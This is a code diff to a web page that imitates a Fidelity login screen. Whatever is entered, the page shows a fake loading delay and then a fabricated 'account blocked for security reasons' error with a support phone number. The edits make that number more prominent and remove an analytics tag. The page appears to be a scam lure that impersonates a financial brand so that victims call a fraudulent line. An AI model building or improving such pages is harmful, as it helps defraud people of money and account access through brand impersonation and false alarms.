@@ -1,15 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y8MCNE5XF"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-9Y8MCNE5XF');
-</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fidelity Login</title>
@@ -142,22 +133,36 @@
 
         .error {
             color: red;
-            margin-top: 10px;
+            margin-bottom: 10px;
             font-size: 14px;
+            background-color: #f8d7da;
+            padding: 10px;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            text-align: left;
         }
 
-        /* Loading GIF styles */
-        .loading-container {
+        .error a {
+            color:  #155724;
+            text-decoration: none;
+            background-color: #f8d7da;
+            padding: 10px 15px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .error a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading animation styles */
+        #loading {
             display: none;
             text-align: center;
             margin-top: 20px;
         }
 
-        .loading-container img {
-            width: 50px;
-        }
-
-        /* Media Queries for Responsiveness */
         @media (max-width: 600px) {
             header {
                 padding: 10px 15px;
@@ -192,9 +197,10 @@
         </div>
     </header>
 
-    <div class="container">
+    <div class="container" id="login-container">
         <h2>Log in</h2>
         <form id="loginForm">
+            <div id="error-message" class="error" style="display:none;"></div> <!-- Moved above username -->
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" id="username" name="username" placeholder="Username">
@@ -202,8 +208,6 @@
             <div class="form-group">
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" placeholder="Password">
-                <div id="error-message" class="error"></div> <!-- Error message block -->
-		
             </div>
             <div class="form-group">
                 <input type="checkbox" id="remember" name="remember">
@@ -214,21 +218,19 @@
                 <a href="#">Forgot username or password?</a>
             </div>
         </form>
-        
-        <!-- Loading GIF -->
-        <div class="loading-container" id="loading">
-            <img src="loading-green-loading.gif" alt="Loading...">
-            <p>Logging in...</p>
-        </div>
     </div>
 
-    <!-- Signup link outside the container -->
+    <div id="loading">
+        <img src="loading new gif.gif" alt="Loading" width="80" height="80">
+        <h3>Loading...</h3>
+    </div>
+
     <div class="signup-link">
         New to Fidelity? <a href="#">Open an account or sign up.</a>
     </div>
 
     <script>
-        // Function to save username to localStorage if "Remember my username" is checked
+        // Save username to localStorage if "Remember my username" is checked
         function saveUsername() {
             const username = document.getElementById('username').value;
             const remember = document.getElementById('remember').checked;
@@ -240,7 +242,7 @@
             }
         }
 
-        // Function to populate the username field if it was remembered
+        // Populate the username field if remembered
         function loadRememberedUsername() {
             const rememberedUsername = localStorage.getItem('rememberedUsername');
             if (rememberedUsername) {
@@ -252,32 +254,32 @@
         // Show error message on login attempt
         function showErrorMessage() {
             const errorMessage = document.getElementById('error-message');
-            errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support: <a href="tel:+18444991812">+1-844-499-1812</a>';
+            errorMessage.style.display = 'block';
+            errorMessage.innerHTML = 'Error Code : 00X47800. <br> Your account has been blocked due to security reasons. <br> Contact Support: <a href="tel:+18444991812"><h3 style="color:black;">+1-844-499-1812</h3></a>';
+        }
+
+        // Show loading animation
+        function showLoading() {
+            document.getElementById('login-container').style.display = 'none'; // Hide the form
+            document.getElementById('loading').style.display = 'block'; // Show loading animation
         }
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Show loading GIF
-            const loading = document.getElementById('loading');
-            loading.style.display = 'block';
+            // Show loading animation
+            showLoading();
 
-            // Hide form
-            const form = document.getElementById('loginForm');
-            form.style.display = 'none';
-
-            // Simulate loading and show error message after 2 seconds
+            // Simulate a delay (e.g., a network request)
             setTimeout(function() {
-                loading.style.display = 'none'; // Hide loading GIF
-                form.style.display = 'block'; // Show form again
-                showErrorMessage(); 
-// Show error message
+                showErrorMessage(); // Show the error message after 2 seconds
+                document.getElementById('loading').style.display = 'none'; // Hide loading animation
+                document.getElementById('login-container').style.display = 'block'; // Show the form again
             }, 2000);
 
-            // Save the username if remember is checked
+            // Save the username if "Remember" is checked
             saveUsername();
-
         });
 
         // Load remembered username on page load
@@ -285,6 +287,5 @@
             loadRememberedUsername();
         };
     </script>
-
 </body>
 </html>
